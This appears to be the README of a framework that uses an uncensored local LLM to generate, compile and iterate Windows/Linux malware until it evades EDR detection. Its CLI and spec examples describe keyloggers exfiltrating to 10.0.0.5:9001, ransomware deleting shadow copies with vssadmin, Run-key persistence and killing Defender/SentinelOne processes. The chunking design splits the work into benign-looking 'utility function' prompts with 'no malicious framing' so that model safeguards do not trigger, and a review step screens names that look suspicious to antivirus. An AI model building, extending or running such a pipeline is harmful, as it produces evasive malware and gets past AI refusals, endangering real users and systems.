# Malware Generation Framework

Automated pipeline that queries threat-intelligence databases, plans and generates
Windows/Linux malware source code via a local LLM (LM Studio / llama.cpp), cross-compiles
it, deploys it into a QEMU/KVM VM, checks EDR detection, and iterates until the binary is
undetected and behaviorally confirmed — with cloud LLM (Fugu / Sakana AI) assisting failure analysis.

---

## High-Level Pipeline

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                        MALWARE GENERATION FRAMEWORK                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

  spec.yaml
  (target OS, EDRs,          ┌─────────────┐
   malware_type,      ──────► │ spec_parser │ ──► TargetEnvironmentSpec
   behavior_spec, …)          └─────────────┘
                                     │
                     ┌───────────────┴───────────────────────────┐
                     │  EARLY VALIDATION (before any async work)  │
                     │  • --spec file must exist on disk          │
                     │  • malware_type must be set (CLI or YAML)  │
                     └───────────────┬───────────────────────────┘
                                     │
                                     ▼
                     ╔══════════════════════════╗
                     ║    PHASE 1 — DB QUERY    ║
                     ╠══════════════════════════╣
                     │  malware_corpus          │  → MalwareTechnique[]
                     │  PoC corpus              │  → PoC[]
                     │  CTI database            │  → CTIFinding[]
                     ╚══════════════════════════╝
                                     │
                                     ▼ QueryResult
                     ╔══════════════════════════╗
                     ║   PHASE 2 — SELECTION    ║
                     ╠══════════════════════════╣
                     │  context_builder         │  deduplicate + rank
                     │  evasion_selector        │  EDR-aware technique ranking
                     │  exploit_selector        │  CVE severity ranking
                     │  compiler_selector       │  build flag generation
                     ╚══════════════════════════╝
                                     │
                                     ▼ ContextBlock
                     ╔══════════════════════════════════════════════════╗
                     ║           PHASE 3 — CODE GENERATION             ║
                     ╠══════════════════════════════════════════════════╣
                     │                                                  │
                     │  ┌──────────────────────────────────────────┐   │
                     │  │  PLANNING + RETRY LOOP                   │   │
                     │  │                                          │   │
                     │  │  outer: review cycles (max 2)            │   │
                     │  │  inner: parse retries   (max 3)          │   │
                     │  │                                          │   │
                     │  │  prompt: _PLAN_PROMPT                    │   │
                     │  │    ├─ malware_type                       │   │
                     │  │    ├─ behavior_spec (if set)             │   │
                     │  │    └─ revision_context (if reviewing)    │   │
                     │  │  prefill: "LANGUAGE: c\n"                │   │
                     │  │  → _parse_plan() → MalwarePlan           │   │
                     │  │                                          │   │
                     │  │  if no COMPONENT blocks found → retry    │   │
                     │  │  up to 3 times before moving on          │   │
                     │  └───────────────┬──────────────────────────┘   │
                     │                  │ plan parsed OK                │
                     │                  ▼                               │
                     │  ┌──────────────────────────────────────────┐   │
                     │  │  PLAN STRUCTURE REVIEW                   │   │
                     │  │                                          │   │
                     │  │  _PLAN_REVIEW_PROMPT asks LLM:           │   │
                     │  │    1. all components present?            │   │
                     │  │    2. APIs + call order correct?         │   │
                     │  │    3. names too suspicious for AV?       │   │
                     │  │    4. dependencies valid?                │   │
                     │  │                                          │   │
                     │  │  VERDICT: APPROVED ──────────────────►  │   │
                     │  │                         proceed to chunks│   │
                     │  │  VERDICT: REVISION_NEEDED                │   │
                     │  │    → append revision instructions        │   │
                     │  │    → re-plan (up to 2 revision cycles)   │   │
                     │  └───────────────┬──────────────────────────┘   │
                     │                  │ plan approved (or cycles done)│
                     │         ┌────────┴────────┐                     │
                     │         │ plan OK?        │ plan still None?    │
                     │         ▼                 ▼                     │
                     │  ┌─────────────┐  ┌──────────────────────────┐ │
                     │  │  CHUNKED    │  │  MONOLITHIC FALLBACK     │ │
                     │  │ GENERATION  │  │  (single 32k-token prompt)│ │
                     │  └──────┬──────┘  └──────────────────────────┘ │
                     │         └──────────────► source_code (C)       │
                     ╚══════════════════════════════════════════════════╝
                                     │
                                     ▼
                     ╔══════════════════════════════════════════════════╗
                     ║   PHASE 3b — BEHAVIORAL VALIDATION PLAN (once)  ║
                     ╠══════════════════════════════════════════════════╣
                     │                                                  │
                     │  generate_validation_plan(target_spec)           │
                     │    _VALIDATION_PLAN_PROMPT → local LLM           │
                     │    → 3-5 CHECK/COMMAND/SUCCESS_PATTERN blocks     │
                     │    → ValidationPlan{ checks[], is_windows }       │
                     │                                                  │
                     │  Generated once; reused across all loop iters.   │
                     │  Commands are specific to malware_type +          │
                     │  behavior_spec (e.g. "check if keylog file        │
                     │  exists", "check ESTABLISHED connections").       │
                     ╚══════════════════════════════════════════════════╝
                                     │
                                     ▼ source_code written to results/malware_source.c
                     ╔══════════════════════════════════════════════════╗
                     ║       PHASE 4 — VM PROVISIONING (optional)      ║
                     ╠══════════════════════════════════════════════════╣
                     │  ProvisionEngine                                 │
                     │  ├─ ensure_windows_iso()                         │
                     │  ├─ generate_autounattend_xml()                  │
                     │  ├─ create_autounattend_iso() — FAT12 USB image  │
                     │  ├─ swtpm start — software TPM 2.0               │
                     │  ├─ QEMUProcess.start() — OVMF/KVM/virtio-net    │
                     │  └─ _wait_for_ssh() — banner check + auth        │
                     │                                                  │
                     │  OR: --use-existing-vm --vm-port 10022           │
                     │       attach to already-running QEMU process     │
                     │  OR: --boot-existing                             │
                     │       boot already-installed COW disk, no re-    │
                     │       install (skips the full unattended setup)  │
                     ╚══════════════════════════════════════════════════╝
                                     │
                                     ▼ VMInstance (ssh_port, credentials)
                     ╔══════════════════════════════════════════════════╗
                     ║      PHASE 5 — VERIFY + RETRY LOOP              ║
                     ╠══════════════════════════════════════════════════╣
                     │                                                  │
                     │  LoopController (max_iters, exponential backoff) │
                     │                                                  │
                     │  ┌──────────────────────────────────────────┐   │
                     │  │              ITERATION N                  │   │
                     │  │                                           │   │
                     │  │  cross-compile MinGW on HOST              │   │
                     │  │  SFTP .exe to VM                          │   │
                     │  │  execute → check EDR/Defender alerts      │   │
                     │  │  behaviour checks (netstat, file, etc.)   │   │
                     │  │  sandbox detection (CPU count / RAM)      │   │
                     │  │               │                           │   │
                     │  │  undetected + compiled + ran cleanly?     │   │
                     │  │         /              \                  │   │
                     │  │       YES               NO                │   │
                     │  │        │                 │                │   │
                     │  │        ▼               FAILURE ANALYSIS   │   │
                     │  │  BEHAVIORAL VALIDATION  (see below)       │   │
                     │  │  run ValidationPlan.checks[] on VM        │   │
                     │  │  majority must pass                       │   │
                     │  │    pass → FULL SUCCESS, stop loop         │   │
                     │  │    fail → FUNCTIONAL_FAILURE mode         │   │
                     │  │           full rewrite with behavioral    │   │
                     │  │           context appended                │   │
                     │  └──────────────────────────────────────────┘   │
                     ╚══════════════════════════════════════════════════╝
```

---

## Failure Analysis & Auto-Fix Loop

```
  Verification failed?
         │
         ├─ compilation_failed?
         │       │
         │    YES ──► fix_compile_error(src, compiler_error)  [Fugu→local]
         │              → _state["fixed_source"]  (returned directly, no re-gen)
         │              if fix fails → analyze_failure(mode=compilation_failed)
         │
         ├─ execution_crashed / detected?
         │       │
         │      ──► analyze_failure(mode, detection_score)  [Fugu→local]
         │              → FailureAnalysis { summary, problem_functions[], patch_instructions }
         │              → full_rewrite_needed?
         │                 YES → generate_variant(error_context)
         │                 NO  → patch_source() — rewrite ONLY flagged functions
         │
         └─ functional_failed?
                 │
                ──► forced full rewrite, error_output =
                      "CRITICAL: Malware ran and was undetected but produced
                       NO observable effect. Expected: <behavior_spec>.
                       Rewrite so the malware actually performs its function."
                    → generate_variant(error_context)

  LLM routing for fix_compile_error and analyze_failure:
    1st try → Fugu (cloud, api.sakana.ai, model: "fugu")
    fallback → local LLM (LM Studio, localhost:1234)
    both fail → None → loop continues with variant generation
```

---

## LLM Routing

```
  ┌───────────────────────────────────────────────────────┐
  │                    LLM CLIENTS                        │
  │                                                       │
  │  SubprocessLLMClient          CloudLLMClient          │
  │  ├─ LM Studio HTTP API        ├─ Sakana AI / Fugu     │
  │  │   localhost:1234            │   api.sakana.ai/v1    │
  │  │   /v1/chat/completions      │   model: "fugu"       │
  │  ├─ model: qwen3.6-35b        ├─ env: FUGU_API_KEY    │
  │  │   (uncensored variant)     └─ env: FUGU_API_URL    │
  │  ├─ assistant prefill for                             │
  │  │   structured output calls                          │
  │  │   e.g. prefix="LANGUAGE: c\n" for planning        │
  │  └─ reasoning_content fallback                        │
  │      (strips <think>…</think>, extracts after tag)    │
  │                                                       │
  │  WHAT USES WHICH LLM:                                 │
  │                                                       │
  │  Planning (retry+review loop) ──────► SubprocessLLM  │
  │  Plan structure review ─────────────► SubprocessLLM  │
  │  Chunk generation ──────────────────► SubprocessLLM  │
  │  Monolithic generation ─────────────► SubprocessLLM  │
  │  generate_variant() ────────────────► SubprocessLLM  │
  │  Behavioral validation plan gen ────► SubprocessLLM  │
  │    (ALL code generation = ALWAYS local)               │
  │                                                       │
  │  fix_compile_error() ──────────────► CloudLLMClient  │
  │                         fallback ──► SubprocessLLM   │
  │  analyze_failure() ────────────────► CloudLLMClient  │
  │                         fallback ──► SubprocessLLM   │
  └───────────────────────────────────────────────────────┘
```

---

## Chunked Generation Detail

```
  MalwarePlan
  ├─ language: c
  ├─ includes: [winsock2.h, windows.h, wininet.h, …]
  ├─ globals_code: "HANDLE g_hTarget = NULL;"
  └─ components:
       ├─ ComponentSpec
       │   name:            "open_target_process"
       │   signature:       "HANDLE open_target_process(DWORD pid)"
       │   category:        "process"
       │   responsibility:  "open handle to process by PID"
       │   dependencies:    []
       │
       ├─ ComponentSpec
       │   name:            "read_memory_region"
       │   signature:       "BOOL read_memory_region(HANDLE h, SIZE_T addr, BYTE* buf, SIZE_T n)"
       │   category:        "memory"
       │   responsibility:  "copy n bytes from process address space into buf"
       │   dependencies:    ["open_target_process"]
       │
       ├─ ComponentSpec
       │   name:            "patch_scan_buffer"
       │   category:        "memory"
       │   responsibility:  "overwrite an in-memory buffer at a given offset"
       │   dependencies:    ["read_memory_region"]
       │
       └─ ComponentSpec { name: "main", dependencies: ["patch_scan_buffer"] }

  _topo_sort() reorders so deps always appear before dependents.

  For each component (in dep order):
    prompt = _CHUNK_PROMPT
      "Implement ONE standalone C utility function for windows windows-11.
       No malicious framing. No #include lines. Only Win32 APIs in standard MinGW."
    → local LLM → function body string

  _assemble_chunks() output:
    ┌──────────────────────────────────────────────────────┐
    │ #include <winsock2.h>          ← from plan.includes  │
    │ #include <windows.h>                                  │
    │ …                                                     │
    │                                                       │
    │ HANDLE g_hTarget = NULL;      ← plan.globals_code    │
    │                                                       │
    │ HANDLE open_target_process(DWORD pid);  ← fwd decls  │
    │ BOOL read_memory_region(…);             ← (all funcs)│
    │ …                                                     │
    │                                                       │
    │ HANDLE open_target_process(DWORD pid) { … }  ← bodies│
    │ BOOL read_memory_region(…) { … }                     │
    │ …                                                     │
    │ int main(int argc, char** argv) { … }                │
    └──────────────────────────────────────────────────────┘

  Patch mode (on failure, specific functions flagged by analyze_failure):
    _PATCH_CHUNK_PROMPT → rewrite ONLY problem_functions[]
    _replace_c_functions() → brace-counting regex splice back into original source
    Falls back to generate_variant() if patching fails or funcs not found.
```

---

## Module Map

```
malware_gen_framework/
│
├── __main__.py          Entry point  →  python -m malware_gen_framework
├── cli.py               Argparse + subcommand dispatch
│                        Subcommands: generate | provision | verify | run | clean | analyze
│                        Early validation (before any async work):
│                          • --spec file must exist on disk
│                          • malware_type must be set (CLI or in YAML)
│
├── pipeline.py          MalwarePipeline — end-to-end orchestrator
│                        Stage 1:   parse spec → generate source code
│                        Stage 1b:  generate_validation_plan() — one-time LLM call that
│                                   produces VM commands to verify behavioral success
│                        Stage 2:   provision VM (or attach to existing)
│                        Stage 3:   verify+loop (VM path or local compile-check fallback)
│                        _state dict: last_analysis / last_source / last_plan / fixed_source
│                        _generate_fn: fixed_source → patch_source → generate_variant
│                        _verify_fn:   compile-fix or analyze_failure on every failure,
│                                      plus behavioral validation on undetected+ran runs
│
├── generation_engine.py GenerationEngine + LLM clients + data models
│   ├─ SubprocessLLMClient    local LLM (LM Studio HTTP or llama.cpp CLI)
│   ├─ CloudLLMClient         OpenAI-compatible (Fugu / sakana.ai)
│   ├─ ComponentSpec          one planned C function
│   ├─ MalwarePlan            complete function structure from planning phase
│   ├─ FailureAnalysis        summary, problem_functions[], patch_instructions
│   ├─ GenerationEngine
│   │   generate()              DB → context → compiler → plan+review → chunks → source
│   │     planning retry loop:  max 3 parse-retries per review cycle
│   │     plan review loop:     max 2 revision cycles (_PLAN_REVIEW_PROMPT)
│   │                           APPROVED → chunks; REVISION_NEEDED → re-plan
│   │   generate_validation_plan()  LLM generates 3-5 behavioral checks (_VALIDATION_PLAN_PROMPT)
│   │   generate_variant()      re-generates with modified malware_type seed
│   │   patch_source()          rewrite only flagged functions (_PATCH_CHUNK_PROMPT)
│   │   _review_plan()          calls _PLAN_REVIEW_PROMPT, parses APPROVED/REVISION_NEEDED
│   │   _format_plan_summary()  formats MalwarePlan for the review prompt
│   │   _generate_chunks()      N focused LLM calls, one per ComponentSpec
│   │   _assemble_chunks()      combines into complete C source with fwd declarations
│   └─ ErrorAnalyzer
│       fix_compile_error()     cloud→local: returns complete fixed source file
│       analyze_failure()       cloud→local: returns FailureAnalysis struct
│
├── verifier.py          Verifier — compile → deploy → execute → EDR check → behavioral check
│   ├─ ValidationCheck        description + command + success_pattern (one behavioral check)
│   ├─ ValidationPlan         list of ValidationChecks + is_windows flag
│   ├─ BehaviourCheck enum    COMPILATION_SUCCESS | EXECUTION_SUCCESS | LAUNCHES_NETWORK |
│   │                         CREATES_FILE | MODIFIES_REGISTRY | FUNCTIONAL_GOAL_MET | …
│   ├─ VerificationResult     detection_score, alerts[], behaviour_checks{},
│   │                         compilation_output, execution_output,
│   │                         functional_validation_passed (None=not checked)
│   ├─ Verifier.verify()      full Windows or Linux verification path
│   ├─ run_validation_checks() runs ValidationPlan on live VM, majority-pass threshold
│   ├─ _verify_windows()      cross-compile MinGW on host → SFTP .exe → run on VM
│   ├─ _verify_linux()        SFTP source → compile on VM → run
│   ├─ _check_edr_alerts()    PowerShell: Get-WinEvent Defender/Operational
│   ├─ _run_behaviour_checks() netstat ESTABLISHED, file presence
│   ├─ _check_sandbox()       CPU count + RAM size heuristics
│   └─ verify_standalone()    host-only compile check (no VM)
│
├── loop_controller.py   LoopController — retry loop with exponential backoff
│                        success = detection_score=="none" AND failure_mode is None
│                        Failure modes: COMPILATION_FAILED | EXECUTION_CRASHED |
│                                       DETECTED | SANDBOX_DETECTED | CONTEXT_STUCK |
│                                       FUNCTIONAL_FAILURE | LLM_GENERATION_EMPTY
│                        FUNCTIONAL_FAILURE: ran + evaded AV but produced no observable effect
│                        Backoff: 1s → 2s → 4s → … capped at 30s
│
├── provision_engine.py  ProvisionEngine + QEMUProcess + VMInstance
│   ├─ QEMUProcess.start()    QEMU/KVM + OVMF UEFI + swtpm TPM 2.0
│   ├─ _wait_for_ssh()        asyncssh banner + auth (rejects SLIRP false positives)
│   ├─ VMInstance.upload_file()     asyncssh SFTP put
│   ├─ VMInstance.execute_command() asyncssh exec with timeout
│   ├─ VMInstance.save_snapshot()   QEMU QMP savevm (clean state for loop resets)
│   └─ VMInstance.restore_snapshot() QMP loadvm (disk+RAM+CPU atomic restore)
│
├── windows_provisioner.py  generate_autounattend_xml() + create_autounattend_iso()
├── linux_provisioner.py    generate_cloud_init_yaml() + create_cloud_init_iso()
├── image_sources.py        ensure_windows_iso() / ensure_linux_image()
│
├── spec_parser.py       parse_target_spec() — YAML/JSON → TargetEnvironmentSpec
│                        CLI overrides win over YAML; YAML wins over model defaults
│                        behavior_spec from CLI (--behavior) overrides YAML field
├── target_spec.py       TargetEnvironmentSpec (Pydantic v2)
│                        Fields: os_platform, os_version, edrs, antivirus,
│                                installed_compilers, malware_type, behavior_spec,
│                                custom_gates, domain_joined, admin_rights,
│                                sandbox_detectors
├── prompt_templates.py  Jinja2 templates: GENERATE_MALWARE_TEMPLATE (monolithic),
│                        BUILD_COMPILER_TEMPLATE — both now inject behavior_spec
├── db_models.py         MalwareTechnique, PoC, CTIFinding, QueryResult
├── config_models.py     VMProvisionConfig, TargetOS enum
└── debug_logger.py      DebugLogger — phase/step/dump/ok/fail structured output
```

---

## CLI Usage

```bash
# ------------------------------------------------------------------
# REQUIRED: --spec must point to an existing file.
# malware_type must be set either in the YAML or via --malware-type.
# Both are validated before anything else runs.
# ------------------------------------------------------------------

# Generate only — no VM, writes results/malware_source.c
python -m malware_gen_framework generate \
  --spec target.yaml \
  --malware-type keylogger \
  --output ./results

# Add detailed behavioral requirements (passed verbatim to the LLM):
python -m malware_gen_framework generate \
  --spec target.yaml \
  --malware-type keylogger \
  --behavior "capture all keystrokes and window titles, encrypt with AES-256, \
              exfiltrate to 10.0.0.5:9001 over TCP every 30 seconds, \
              persist via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
  --output ./results

# Full run: generate → fresh VM install → verify → retry loop
python -m malware_gen_framework run \
  --spec target.yaml \
  --malware-type ransomware \
  --output ./results \
  --loop --max-iters 5

# Full run with detailed behavior spec:
python -m malware_gen_framework run \
  --spec target.yaml \
  --malware-type ransomware \
  --behavior "encrypt all .docx .xlsx .pdf files in C:\Users with AES-256, \
              drop ransom note README.txt in each folder, \
              delete shadow copies with vssadmin" \
  --output ./results \
  --loop --max-iters 5

# Reuse already-running VM (QEMU running, SSH on port 10022):
python -m malware_gen_framework run \
  --spec target.yaml --malware-type keylogger \
  --use-existing-vm --vm-port 10022 \
  --loop --max-iters 5

# Boot an already-installed VM disk without re-running the Windows installer:
python -m malware_gen_framework run \
  --spec target.yaml --malware-type keylogger \
  --boot-existing \
  --loop --max-iters 5

# Boot existing disk just to inspect (holds SSH open until Ctrl-C):
python -m malware_gen_framework provision --boot-existing

# Local compile-check loop — no VM needed, just MinGW cross-compile check
python -m malware_gen_framework run \
  --spec target.yaml --malware-type exe \
  --loop --max-iters 5

# Provision a fresh VM only (for testing the VM setup in isolation):
python -m malware_gen_framework provision --os windows-11

# Query DBs and show ranked context without generating anything:
python -m malware_gen_framework analyze --spec target.yaml --malware-type keylogger

# Delete COW snapshots + temp ISOs (keeps base images for next run):
python -m malware_gen_framework clean

# Delete everything including base OS image copies (next run re-downloads):
python -m malware_gen_framework clean --all

# ------------------------------------------------------------------
# VM management
# ------------------------------------------------------------------

# Kill a running VM:
kill $(pgrep qemu-system-x86)

# Find the PID if there are multiple QEMU processes:
ps aux | grep qemu-system-x86

# Reuse without reprovisioning (VM is still running):
#   --use-existing-vm --vm-port 10022

# Reuse after reboot (VM disk exists but process died):
#   --boot-existing
```

---

## spec.yaml Fields

```yaml
os_platform: windows        # linux | windows
os_version:  windows-11    # ubuntu-24.04 | ubuntu-22.04 | debian-bookworm
                            # windows-11   | windows-10

# High-level payload type — the LLM reads this and decides payload format
# and which DB techniques to prioritize.
# REQUIRED: must be set here or via --malware-type on the CLI.
malware_type: keylogger     # "ransomware" | "keylogger" | "backdoor" |
                            # "info stealer" | "dropper" | "credential dumper" |
                            # "exe" | "dll" | "service" | "script" | "driver"

# Detailed behavioral requirements — passed verbatim to the LLM for every
# prompt (planning, per-chunk, monolithic fallback, behavioral validation plan).
# Optional — if omitted, malware_type alone drives generation.
# Can also be set / overridden via --behavior on the CLI.
behavior_spec: >
  Captures all keystrokes and active window titles. Every 60 seconds,
  AES-256 encrypts the buffer and sends it to 10.0.0.5:9001 over a raw
  TCP socket. Persists via HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
  On startup kills any process named MsMpEng.exe or SentinelAgent.exe.

edrs:
  - defender                # crowdstrike | sentinel_one | defender |
  - crowdstrike             # carbon_black | trend_micro | elastic_security

antivirus: null
patch_level: null           # "latest" | "2023-Q1" | null

installed_compilers:        # informs compiler instruction generation
  - mingw-w64
  - python3

admin_rights: true          # malware runs as admin on target
domain_joined: false

custom_gates:               # free-form evasion requirements injected into every prompt
  - no console window
  - sleep 5 seconds before main execution
  - check username before running

sandbox_detectors:          # triggers sandbox-aware code generation
  - vmware
  - virtualbox
```

---

## Behavioral Validation

When `--loop` is active and a VM is available, the framework validates that undetected
malware actually *did something* — not just ran and exited cleanly.

```
  Before the loop starts:
    generate_validation_plan(target_spec)
      → LLM produces 3-5 CHECK/COMMAND/SUCCESS_PATTERN blocks
      → e.g. for a keylogger:
          CHECK: Keylog file was created
          COMMAND: dir C:\Users\vmuser\keys.log
          SUCCESS_PATTERN: keys.log
          ---
          CHECK: Outbound TCP connection established
          COMMAND: netstat -ano | findstr ESTABLISHED
          SUCCESS_PATTERN: ESTABLISHED
          ---

  On each iteration where detection_score=="none" AND execution succeeded:
    verifier.run_validation_checks(plan)
      → runs each COMMAND on the live VM via SSH
      → checks if SUCCESS_PATTERN appears in output
      → majority threshold (≥ N/2 checks must pass)
      → True  → FULL SUCCESS, loop stops
      → False → FUNCTIONAL_FAILURE
                 forced full rewrite with explicit context:
                 "Malware ran and was undetected but produced no observable effect"
```

---

## VM Disk Persistence

The Windows 11 VM disk is a COW (copy-on-write) QCOW2 snapshot at
`/tmp/vm_provision/base_windows-11.cow.qcow2`. On this system `/tmp` is a real
directory (not a tmpfs RAM disk) so the disk survives reboots and persists across
runs. At most 2 COW snapshots are kept globally (`_trim_stored_vms`); older ones
are pruned automatically. The base OS image (`.iso`) and VirtIO ISO are never
deleted — they are reused by every subsequent provision run.

```
/tmp/vm_provision/
├── base_windows-11.iso           Windows 11 install ISO (never deleted)
├── base_windows-11.cow.qcow2    COW working disk (current run)
├── autounattend-windows-11.iso  Unattended install config disk
├── OVMF_VARS_4M.fd              UEFI variable store
└── vm-windows-11.qmp            QEMU monitor socket
```

**Kill + reuse cheatsheet:**

```bash
# Kill the VM process
kill $(pgrep qemu-system-x86)

# Reuse — VM process is still alive, SSH is already up:
--use-existing-vm --vm-port 10022

# Reuse — VM was killed or machine rebooted, disk is intact:
--boot-existing
```

---

## External Dependencies

| Dependency | Purpose | Install |
|---|---|---|
| `qemu-system-x86_64` | VM hypervisor | `apt install qemu-system-x86` |
| `swtpm` | Software TPM 2.0 | `apt install swtpm` |
| `OVMF` | UEFI firmware | `apt install ovmf` |
| `x86_64-w64-mingw32-gcc` | Windows cross-compiler | `apt install gcc-mingw-w64-x86-64` |
| `asyncssh` | SSH/SFTP to VM | `pip install asyncssh` |
| `pydantic` | Spec validation | `pip install pydantic` |
| `jinja2` | Prompt templates | `pip install jinja2` |
| `pyyaml` | YAML spec files | `pip install pyyaml` |
| LM Studio | Local LLM server | `localhost:1234` |
| Qwen3-35B (uncensored) | Code generation model | loaded in LM Studio |
| Fugu API (optional) | Cloud failure analysis | `export FUGU_API_KEY=…` |

---

## Databases (External, not in this repo)

```
/home/kei/llm_vault/
├── malware_corpus/          Malware technique + PoC vector database
│   ├── query_malware.py     Assembly-level evasion techniques
│   │                        → MalwareTechnique (name, description, category,
│   │                                            os_type, edr_detection,
│   │                                            detection_rating, references)
│   └── query_poc.py         CVE exploit repositories
│                            → PoC (cve, title, description, exploit_type,
│                                   severity, source, code, references)
└── hermes_qwen_cti/         CTI RAG knowledge base (Qwen-indexed threat reports)
    └── query_rag.py         → CTIFinding (description, severity, related_cves,
                                           references)
```
